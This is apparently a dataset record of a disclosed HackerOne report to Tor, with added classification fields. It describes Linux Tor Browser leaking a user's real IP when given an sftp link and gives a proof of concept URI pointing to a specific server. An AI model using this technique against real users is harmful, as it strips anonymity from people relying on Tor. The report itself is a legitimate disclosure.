{
    "reported_to": "Tor",
    "reported_by": "rethink5807 ",
    "title": "Linux TBB SFTP URI allows local IP disclosure",
    "content": "\nBrowsing to a simple URL to an sftp URI allows bypasses socks proxy for DNS and browsing.\nTested on a clean install of Ubuntu 16.04 with TBB 7.0.2 (4097d43aa0be86ae3fe43ec8f3ac5394) download from https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz\nPOC:\nNavigate to sftp://104.131.180.179:80/index.php\nAfter ~1 minute check http://104.131.180.179/ip,txt for your IP address\nIt appears that ubuntu's default SSH client is associated with this URI which causes the client to attempt the connection on behalf of the user. The windows TBB does not appear to be affected.\nExcerpt from apache logs:\napache2: [core:error][pid 10671] [client x.x.x.x:40063] AH00126: Invalid URI in request SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1\nNot surprisingly, the client can also be directed to local resources as well.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": 3000,
    "weaknesses": [
        "Information Disclosure"
    ],
    "screenshots": {},
    "disclosed_date": 1508983080,
    "report_url": "https://hackerone.com/reports/253429",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to sftp://104.131.180.179:80/index.php in Tor Browser on Ubuntu 16.04"
        ],
        [
            2,
            "Check http://104.131.180.179/ip.txt after ~1 minute to see your IP address exposed"
        ]
    ],
    "vuln_description": "The vulnerability involves the Linux Tor Browser Bundle (TBB) improperly handling SFTP URIs, causing the system's default SSH client to make direct connections outside the Tor network. This bypasses Tor's SOCKS proxy for DNS and browsing, leaking the user's real IP address. The issue stems from Ubuntu's default URI handler association for SFTP links.",
    "reason": "The attack is straightforward with minimal components - just crafting a malicious SFTP URI and observing the IP leak. The interaction between the URI handler and Tor's proxy bypass is the only non-obvious element, but this is a well-known class of issues with URI handlers.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}